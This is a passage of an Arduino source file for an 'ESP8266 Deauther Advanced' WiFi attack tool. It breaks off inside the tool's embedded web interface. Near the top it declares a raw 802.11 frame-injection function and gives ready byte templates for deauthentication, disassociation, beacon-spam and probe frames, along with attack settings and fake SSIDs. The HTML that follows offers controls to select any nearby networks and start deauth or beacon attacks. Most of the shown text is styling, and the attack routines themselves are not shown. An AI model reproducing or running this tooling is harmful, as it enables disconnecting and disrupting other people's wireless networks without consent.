
/*
 * ESP8266 Deauther - Advanced All-in-One Edition
 * Developed by 0x0806
 * 
 * This software is licensed under the MIT License
 * Most advanced WiFi security testing tool - all in one .ino
 */

extern "C" {
  #include "user_interface.h"
  #include "espnow.h"
  typedef void (*freedom_outside_cb_t)(uint8_t status);
  int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
}

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

// LittleFS compatibility check
#if defined(ESP8266)
  #include <LittleFS.h>
  #define FILESYSTEM LittleFS
#else
  #include <SPIFFS.h>
  #define FILESYSTEM SPIFFS
#endif

#include <vector>
#include <algorithm>
#include <functional>

// Helper function for min (avoid conflicts with std::min)
template<typename T>
T minVal(T a, T b) {
  return (a < b) ? a : b;
}

// Configuration
#define DEAUTHER_VERSION "v4.0.0-Advanced-0x0806"
#define AP_SSID "ESP8266-Deauther-Advanced"
#define AP_PASS "deauther"
#define LED_PIN 2
#define BUTTON_PIN 0
#define MAX_SSIDS 8
#define MAX_STATIONS 8

// Web server and DNS
ESP8266WebServer server(80);
DNSServer dnsServer;

// Attack variables
bool attacking = false;
bool scanning = false;
bool beaconSpam = false;
bool probeAttack = false;
bool captivePortal = true;
bool packetMonitor = false;

// Packet templates
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x70, 0x6A, 0x01, 0x00
};

uint8_t disassocPacket[26] = {
  0xA0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x70, 0x6A, 0x01, 0x00
};

uint8_t beaconPacket[80] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
  0x05, 0x06, 0xC0, 0x6C, 0x83, 0x1A, 0xF7, 0x8C, 0x7E, 0x00,
  0x00, 0x00, 0x64, 0x00, 0x01, 0x04, 0x00, 0x06, 0x72, 0x72,
  0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96,
  0x24, 0x30, 0x48, 0x6C, 0x03, 0x01, 0x04, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t probePacket[68] = {
  0x40, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x72, 0x72,
  0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96,
  0x24, 0x30, 0x48, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Network data structures
struct AccessPoint {
  String ssid;
  int channel;
  int rssi;
  String bssid;
  bool selected;
  bool hidden;
  String encryption;
};

struct Station {
  String mac;
  String ap_mac;
  int channel;
  int rssi;
  bool selected;
};

struct SSIDData {
  String ssid;
  bool enabled;
  bool wpa2;
};

std::vector<AccessPoint> accessPoints;
std::vector<Station> stations;
std::vector<SSIDData> ssidList;
int selectedAPs = 0;
int selectedStations = 0;
int packetsPerSecond = 20;
unsigned long totalPackets = 0;
unsigned long attackStartTime = 0;

// Statistics
struct Stats {
  unsigned long deauthPackets = 0;
  unsigned long beaconPackets = 0;
  unsigned long probePackets = 0;
  unsigned long capturedPackets = 0;
  unsigned long uniqueDevices = 0;
};
Stats stats;

// Function prototypes
void startAP();
void handleRoot();
void handleScan();
void handleAttack();
void handleStop();
void handleBeacon();
void handleProbe();
void handleSSIDs();
void handleMonitor();
void handleStats();
void handleAPI();
void handleCaptive();
void scanNetworks();
void performAttack();
void performBeaconSpam();
void performProbeAttack();
void packetSniffer(uint8_t *buf, uint16_t len);
void updateLED();
void saveSettings();
void loadSettings();

// Fake WiFi SSIDs for beacon spam (reduced for memory)
const char* fakeSSIDs[] PROGMEM = {
  "FBI Surveillance Van",
  "Free WiFi Totally Safe",
  "Router McRouterface",
  "Tell My WiFi Love Her",
  "404 Network Unavailable",
  "Wu Tang LAN",
  "Loading...",
  "PASSWORD_IS_PASSWORD"
};

const char htmlPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP8266 Deauther Advanced - 0x0806</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --primary-light: #818cf8;
            --secondary: #ec4899;
            --secondary-dark: #db2777;
            --accent: #06b6d4;
            --accent-dark: #0891b2;
            --success: #10b981;
            --success-dark: #059669;
            --warning: #f59e0b;
            --warning-dark: #d97706;
            --danger: #ef4444;
            --danger-dark: #dc2626;
            --info: #3b82f6;
            --info-dark: #2563eb;
            --dark: #0f172a;
            --dark-light: #1e293b;
            --dark-medium: #334155;
            --dark-soft: #475569;
            --light: #f8fafc;
            --light-soft: #f1f5f9;
            --border: #e2e8f0;
            --border-light: #f1f5f9;
            --text: #0f172a;
            --text-light: #334155;
            --text-muted: #64748b;
            --text-subtle: #94a3b8;
            --surface: #ffffff;
            --surface-soft: #f8fafc;
            --surface-medium: #f1f5f9;
            --shadow-xs: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-sm: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            --shadow-2xl: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            --shadow-inner: inset 0 2px 4px 0 rgba(0, 0, 0, 0.06);
            --gradient-bg: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #f5576c 75%, #4facfe 100%);
            --gradient-primary: linear-gradient(135deg, var(--primary), var(--primary-dark));
            --gradient-secondary: linear-gradient(135deg, var(--secondary), var(--secondary-dark));
            --gradient-danger: linear-gradient(135deg, var(--danger), var(--danger-dark));
            --gradient-success: linear-gradient(135deg, var(--success), var(--success-dark));
            --gradient-warning: linear-gradient(135deg, var(--warning), var(--warning-dark));
            --gradient-accent: linear-gradient(135deg, var(--accent), var(--accent-dark));
            --gradient-dark: linear-gradient(135deg, var(--dark), var(--dark-light));
            --gradient-glass: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
            --gradient-mesh: radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                             radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
                             radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.3) 0%, transparent 50%);
            --border-radius-sm: 8px;
            --border-radius-md: 12px;
            --border-radius-lg: 16px;
            --border-radius-xl: 20px;
            --border-radius-2xl: 24px;
            --border-radius-full: 9999px;
            --spacing-xs: 0.25rem;
            --spacing-sm: 0.5rem;
            --spacing-md: 1rem;
            --spacing-lg: 1.5rem;
            --spacing-xl: 2rem;
            --spacing-2xl: 3rem;
            --spacing-3xl: 4rem;
            --animation-duration-fast: 0.15s;
            --animation-duration-normal: 0.3s;
            --animation-duration-slow: 0.5s;
            --animation-easing: cubic-bezier(0.4, 0, 0.2, 1);
            --animation-bounce: cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: var(--gradient-bg);
            background-attachment: fixed;
            min-height: 100vh;
            color: var(--text);
            line-height: 1.6;
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--gradient-mesh);
            z-index: -1;
            opacity: 0.6;
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: var(--spacing-md);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .header {
            text-align: center;
            margin-bottom: var(--spacing-xl);
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px) saturate(180%);
            border-radius: var(--border-radius-2xl);
            padding: var(--spacing-2xl);
            box-shadow: var(--shadow-2xl);
            border: 1px solid rgba(255, 255, 255, 0.2);
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--gradient-glass);
            z-index: 1;
        }

        .header > * {
            position: relative;
            z-index: 2;
        }

        .logo {
            font-size: 3rem;
            font-weight: 900;
            background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: var(--spacing-sm);
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            letter-spacing: -0.025em;
        }

        .tagline {
            color: var(--text-muted);
            font-size: 1.125rem;
            margin-bottom: var(--spacing-md);
            font-weight: 500;
        }

        .version {
            display: inline-block;
            background: var(--gradient-primary);
            color: white;
            padding: var(--spacing-xs) var(--spacing-md);
            border-radius: var(--border-radius-full);
            font-size: 0.875rem;
            font-weight: 600;
            box-shadow: var(--shadow-md);
            position: relative;
            overflow: hidden;
        }

        .version::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left var(--animation-duration-slow) var(--animation-easing);
        }

        .version:hover::before {
            left: 100%;
        }

        .nav-tabs {
            display: flex;
            justify-content: center;
            gap: var(--spacing-sm);
            margin-bottom: var(--spacing-xl);
            flex-wrap: wrap;
            padding: var(--spacing-sm);
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: var(--border-radius-xl);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .nav-tab {
            padding: var(--spacing-md) var(--spacing-lg);
            background: rgba(255, 255, 255, 0.9);
            border: none;
            border-radius: var(--border-radius-md);
            cursor: pointer;
            font-weight: 600;
            transition: all var(--animation-duration-normal) var(--animation-easing);
            color: var(--text-muted);
            position: relative;
            overflow: hidden;
            font-size: 0.9rem;
            backdrop-filter: blur(10px);
        }

        .nav-tab::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--gradient-primary);
            opacity: 0;
            transition: opacity var(--animation-duration-normal) var(--animation-easing);
        }

        .nav-tab:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
            background: rgba(255, 255, 255, 0.95);
        }

        .nav-tab.active {
            background: var(--gradient-primary);
            color: white;
            transform: translateY(-2px);
            box-shadow: var(--shadow-xl);
        }

        .nav-tab.active::before {
            opacity: 1;
        }

        .nav-tab span {
            position: relative;
            z-index: 1;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
            animation: fadeInUp var(--animation-duration-normal) var(--animation-easing);
        }

        @keyframes fadeInUp {
            from { 
                opacity: 0; 
                transform: translateY(20px); 
            }
            to { 
                opacity: 1; 
                transform: translateY(0); 
            }
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: var(--spacing-lg);
            margin-bottom: var(--spacing-xl);
        }

        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px) saturate(180%);
            border-radius: var(--border-radius-xl);
            padding: var(--spacing-lg);
            box-shadow: var(--shadow-xl);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: all var(--animation-duration-normal) var(--animation-easing);
            height: fit-content;
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--gradient-glass);
            opacity: 0;
            transition: opacity var(--animation-duration-normal) var(--animation-easing);
        }

        .card:hover {
            transform: translateY(-8px) scale(1.02);
            box-shadow: var(--shadow-2xl);
            border-color: rgba(255, 255, 255, 0.3);
        }

        .card:hover::before {
            opacity: 1;
        }

        .card > * {
            position: relative;
            z-index: 1;
        }

        .card-title {
            font-size: 1.375rem;
            font-weight: 700;
            margin-bottom: var(--spacing-md);
            color: var(--text);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
        }

        .card-title::before {
            content: '';
            width: 4px;
            height: 20px;
            background: var(--gradient-primary);
            border-radius: var(--border-radius-full);
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: var(--spacing-sm);
            padding: var(--spacing-md) var(--spacing-lg);
            border: none;
            border-radius: var(--border-radius-md);
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            transition: all var(--animation-duration-fast) var(--animation-easing);
            font-size: 0.9rem;
            margin: var(--spacing-xs);
            min-width: 140px;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left var(--animation-duration-slow) var(--animation-easing);
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn-primary { 
            background: var(--gradient-primary); 
            color: white; 
            box-shadow: var(--shadow-lg);
        }
        
        .btn-secondary { 
            background: var(--gradient-secondary); 
            color: white; 
            box-shadow: var(--shadow-lg);
        }
        
        .btn-accent { 
            background: var(--gradient-accent); 
            color: white; 
            box-shadow: var(--shadow-lg);
        }
        
        .btn-danger { 
            background: var(--gradient-danger); 
            color: white; 
            box-shadow: var(--shadow-lg);
        }
        
        .btn-success { 
            background: var(--gradient-success); 
            color: white; 
            box-shadow: var(--shadow-lg);
        }
        
        .btn-warning { 
            background: var(--gradient-warning); 
            color: white; 
            box-shadow: var(--shadow-lg);
        }

        .btn-outline {
            background: rgba(255, 255, 255, 0.9);
            color: var(--text);
            border: 2px solid var(--border);
            backdrop-filter: blur(10px);
        }

        .btn:hover {
            transform: translateY(-2px) scale(1.05);
            box-shadow: var(--shadow-2xl);
        }

        .btn:active {
            transform: translateY(0) scale(0.98);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .status {
            padding: var(--spacing-md);
            border-radius: var(--border-radius-md);
            margin: var(--spacing-md) 0;
            font-weight: 600;
            text-align: center;
            border: 2px solid;
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }

        .status::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            animation: shimmer 2s infinite;
        }

        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .status-idle { 
            background: rgba(240, 249, 255, 0.9); 
            color: var(--info); 
            border-color: rgba(59, 130, 246, 0.3); 
        }
        
        .status-scanning { 
            background: rgba(255, 251, 235, 0.9); 
            color: var(--warning-dark); 
            border-color: rgba(245, 158, 11, 0.3); 
        }
        
        .status-attacking { 
            background: rgba(254, 242, 242, 0.9); 
            color: var(--danger-dark); 
            border-color: rgba(239, 68, 68, 0.3); 
        }
        
        .status-beacon { 
            background: rgba(240, 253, 244, 0.9); 
            color: var(--success-dark); 
            border-color: rgba(16, 185, 129, 0.3); 
        }

        .network-list {
            max-height: 450px;
            overflow-y: auto;
            border: 1px solid var(--border);
            border-radius: var(--border-radius-md);
            margin-top: var(--spacing-md);
            backdrop-filter: blur(10px);
        }

        .network-list::-webkit-scrollbar {
            width: 8px;
        }

        .network-list::-webkit-scrollbar-track {
            background: var(--surface-soft);
            border-radius: var(--border-radius-full);
        }

        .network-list::-webkit-scrollbar-thumb {
            background: var(--text-subtle);
            border-radius: var(--border-radius-full);
        }

        .network-list::-webkit-scrollbar-thumb:hover {
            background: var(--text-muted);
        }

        .network-item {
            display: flex;
            align-items: center;
            padding: var(--spacing-md);
            border-bottom: 1px solid var(--border);
            transition: all var(--animation-duration-fast) var(--animation-easing);
            cursor: pointer;
            position: relative;
        }

        .network-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--gradient-primary);
            opacity: 0;
            transition: opacity var(--animation-duration-fast) var(--animation-easing);
        }

        .network-item:hover { 
            background: rgba(248, 250, 252, 0.9); 
            transform: translateX(4px);
        }
        
        .network-item:last-child { 
            border-bottom: none; 
        }
        
        .network-item.selected { 
            background: rgba(239, 246, 255, 0.9); 
            border-color: var(--primary); 
        }

        .network-item.selected::before {
            opacity: 0.1;
        }

        .network-item > * {
            position: relative;
            z-index: 1;
        }

        .network-checkbox { 
            margin-right: var(--spacing-md);
            transform: scale(1.2);
            accent-color: var(--primary);
        }

        .network-info { 
            flex: 1; 
        }

        .network-ssid {
            font-weight: 700;
            color: var(--text);
            font-size: 1.1rem;
            margin-bottom: var(--spacing-xs);
        }

        .network-details {
            font-size: 0.875rem;
            color: var(--text-muted);
            display: flex;
            gap: var(--spacing-md);
            flex-wrap: wrap;
        }

        .network-detail-item {
            display: flex;
            align-items: center;
            gap: var(--spacing-xs);
        }

        .signal-strength {
            width: 80px;
            text-align: right;
            font-weight: 700;
            font-size: 0.9rem;
        }

        .signal-strong { 
            color: var(--success); 
            text-shadow: 0 0 8px rgba(16, 185, 129, 0.3);
        }
        
        .signal-medium { 
            color: var(--warning); 
            text-shadow: 0 0 8px rgba(245, 158, 11, 0.3);
        }
        
        .signal-weak { 
            color: var(--danger); 
            text-shadow: 0 0 8px rgba(239, 68, 68, 0.3);
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: var(--spacing-md);
            margin-top: var(--spacing-md);
        }

        .stat-item {
            text-align: center;
            padding: var(--spacing-md);
            background: rgba(248, 250, 252, 0.9);
            border-radius: var(--border-radius-md);
            border: 1px solid var(--border);
            transition: all var(--animation-duration-normal) var(--animation-easing);
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }

        .stat-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--gradient-primary);
            opacity: 0;
            transition: opacity var(--animation-duration-normal) var(--animation-easing);
        }

        .stat-item:hover {
            transform: translateY(-4px);
            box-shadow: var(--shadow-lg);
            border-color: var(--primary);
        }

        .stat-item:hover::before {
            opacity: 0.1;
        }

        .stat-item > * {
            position: relative;
            z-index: 1;
        }

        .stat-value {
            font-size: 1.875rem;
            font-weight: 800;
            color: var(--primary);
            margin-bottom: var(--spacing-xs);
            text-shadow: 0 0 10px rgba(99, 102, 241, 0.2);
        }

        .stat-label {
            font-size: 0.875rem;
            color: var(--text-muted);
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .input-group {
            margin: var(--spacing-md) 0;
        }

        .input-group label {
            display: block;
            margin-bottom: var(--spacing-sm);
            font-weight: 600;
            color: var(--text);
        }

        .input-group input,
        .input-group select,
        .input-group textarea {
            width: 100%;
            padding: var(--spacing-md);
            border: 2px solid var(--border);
            border-radius: var(--border-radius-sm);
            font-size: 0.9rem;
            transition: all var(--animation-duration-fast) var(--animation-easing);
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
        }

        .input-group input:focus,
        .input-group select:focus,
        .input-group textarea:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
            transform: translateY(-1px);
        }

        .footer {
            text-align: center;
            margin-top: var(--spacing-xl);
            padding: var(--spacing-xl);
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px) saturate(180%);
            border-radius: var(--border-radius-xl);
            box-shadow: var(--shadow-xl);
            border: 1px solid rgba(255, 255, 255, 0.2);
            position: relative;
            overflow: hidden;
        }

        .footer::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--gradient-glass);
            z-index: 1;
        }

        .footer > * {
            position: relative;
            z-index: 2;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .glow {
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { box-shadow: 0 0 10px rgba(99, 102, 241, 0.5); }
            to { box-shadow: 0 0 20px rgba(99, 102, 241, 0.8), 0 0 30px rgba(99, 102, 241, 0.6); }
        }

        .bounce {
            animation: bounce 1s infinite;
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }

        .slide-in {
            animation: slideIn 0.6s var(--animation-easing);
        }

        @keyframes slideIn {
            from { transform: translateX(-100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .fade-in {
            animation: fadeIn 0.8s var(--animation-easing);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .scale-in {
            animation: scaleIn 0.4s var(--animation-bounce);
        }

        @keyframes scaleIn {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .badge {
            display: inline-block;
            padding: 0.25rem 0.5rem;
            border-radius: var(--border-radius-full);
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .badge-primary { background: var(--gradient-primary); color: white; }
        .badge-secondary { background: var(--gradient-secondary); color: white; }
        .badge-success { background: var(--gradient-success); color: white; }
        .badge-warning { background: var(--gradient-warning); color: white; }
        .badge-danger { background: var(--gradient-danger); color: white; }
        .badge-info { background: var(--gradient-accent); color: white; }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: var(--surface-medium);
            border-radius: var(--border-radius-full);
            overflow: hidden;
            margin: var(--spacing-sm) 0;
        }

        .progress-fill {
            height: 100%;
            background: var(--gradient-primary);
            border-radius: var(--border-radius-full);
            transition: width 0.3s ease;
            position: relative;
        }

        .progress-fill::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
            animation: shimmer 2s infinite;
        }

        @media (max-width: 1024px) {
            .container { 
                padding: var(--spacing-sm); 
                max-width: 100%;
            }
            .grid { 
                grid-template-columns: 1fr; 
                gap: var(--spacing-md);
            }
            .nav-tabs {
                gap: var(--spacing-xs);
            }
            .nav-tab {
                padding: var(--spacing-sm) var(--spacing-md);
                font-size: 0.85rem;
            }
        }

        @media (max-width: 768px) {
            .header { 
                padding: var(--spacing-md); 
            }
            .logo { 
                font-size: 2.25rem; 
            }
            .tagline {
                font-size: 1rem;
            }
            .card {
                padding: var(--spacing-md);
            }
            .btn {
                min-width: 120px;
                padding: var(--spacing-sm) var(--spacing-md);
            }
            .stats {
                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: var(--spacing-xs);
            }
            .logo {
                font-size: 1.75rem;
            }
            .nav-tabs {
                flex-direction: column;
                align-items: stretch;
            }
            .nav-tab {
                text-align: center;
            }
            .network-item {
                flex-direction: column;
                align-items: flex-start;
                gap: var(--spacing-sm);
            }
            .signal-strength {
                width: auto;
                text-align: left;
            }
            .stats {
                grid-template-columns: 1fr 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">ESP8266 Deauther Advanced</div>
            <div class="tagline">Most Advanced WiFi Security Testing Tool</div>
            <div class="version">v4.0.0-Advanced-0x0806</div>
        </div>

        <div class="nav-tabs">
            <button class="nav-tab active" onclick="showTab('scanner')"><span>Scanner</span></button>
            <button class="nav-tab" onclick="showTab('attacks')"><span>Attacks</span></button>
            <button class="nav-tab" onclick="showTab('beacon')"><span>Beacon</span></button>
            <button class="nav-tab" onclick="showTab('ssids')"><span>SSIDs</span></button>
            <button class="nav-tab" onclick="showTab('monitor')"><span>Monitor</span></button>
            <button class="nav-tab" onclick="showTab('stats')"><span>Stats</span></button>
        </div>

        <!-- Scanner Tab -->
        <div id="scanner" class="tab-content active">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Network Scanner</div>
                    <div id="status" class="status status-idle">System Ready</div>
                    <button onclick="scanNetworks()" class="btn btn-primary" id="scanBtn">
                        Scan Networks
                    </button>
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-value" id="networkCount">0</div>
                            <div class="stat-label">Networks</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="selectedCount">0</div>
                            <div class="stat-label">Selected</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="stationCount">0</div>
                            <div class="stat-label">Stations</div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="card">
                <div class="card-title">Available Networks</div>
                <div style="display: flex; gap: 1rem; margin-bottom: 1rem; flex-wrap: wrap;">
                    <button onclick="selectAll()" class="btn btn-primary">Select All</button>
                    <button onclick="selectNone()" class="btn btn-primary">Select None</button>
                    <button onclick="selectHidden()" class="btn btn-warning">Hidden Only</button>
                </div>
                <div id="networkList" class="network-list">
                    <div style="padding: 2rem; text-align: center; color: var(--text-muted);">
                        Click "Scan Networks" to discover nearby WiFi networks
                    </div>
                </div>
            </div>
        </div>

        <!-- Attacks Tab -->
        <div id="attacks" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Deauth Attack</div>
                    <div class="input-group">
                        <label>Packets per Second:</label>
                        <input type="range" id="ppsSlider" min="1" max="50" value="20" oninput="updatePPS(this.value)">
                        <span id="ppsValue">20</span> pps
                    </div>
                    <button onclick="startDeauth()" class="btn btn-danger" id="deauthBtn" disabled>
                        Start Deauth
                    </button>
                    <button onclick="stopAttack()" class="btn btn-success" id="stopBtn" disabled>
                        Stop Attack
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">Target Selection</div>
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-value" id="targetAPs">0</div>
                            <div class="stat-label">Target APs</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="targetStations">0</div>
                            <div class="stat-label">Stations</div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-title">Attack Statistics</div>
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-value" id="packetsCount">0</div>
                        <div class="stat-label">Packets Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="uptime">00:00</div>
                        <div class="stat-label">Runtime</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="packetsPerSec">0</div>
                        <div class="stat-label">Packets/Sec</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Beacon Tab -->
        <div id="beacon" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Beacon Spam</div>
                    <p style="color: var(--text-muted); margin-bottom: 1rem;">
                        Creates fake WiFi networks that appear in nearby device scans
                    </p>
                    <button onclick="startBeacon()" class="btn btn-warning" id="beaconBtn">
                        Start Beacon Spam
                    </button>
                    <button onclick="stopBeacon()" class="btn btn-success" id="stopBeaconBtn" disabled>
                        Stop Beacon
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">Probe Attack</div>
                    <p style="color: var(--text-muted); margin-bottom: 1rem;">
                        Sends probe requests to confuse WiFi trackers
                    </p>
                    <button onclick="startProbe()" class="btn btn-warning" id="probeBtn">
                        Start Probe Attack
                    </button>
                    <button onclick="stopProbe()" class="btn btn-success" id="stopProbeBtn" disabled>
                        Stop Probe
                    </button>
                </div>
            </div>
        </div>

        <!-- SSIDs Tab -->
        <div id="ssids" class="tab-content">
            <div class="card">
                <div class="card-title">SSID Management</div>
                <div class="input-group">
                    <label>Add Custom SSID:</label>
                    <input type="text" id="customSSID" placeholder="Enter SSID name" maxlength="32">
                    <button onclick="addSSID()" class="btn btn-primary">Add SSID</button>
                </div>
                <div id="ssidList" class="network-list">
                    <div style="padding: 2rem; text-align: center; color: var(--text-muted);">
                        Loading SSIDs...
                    </div>
                </div>
            </div>
        </div>

        <!-- Monitor Tab -->
        <div id="monitor" class="tab-content">
            <div class="grid">
                <div class="card">
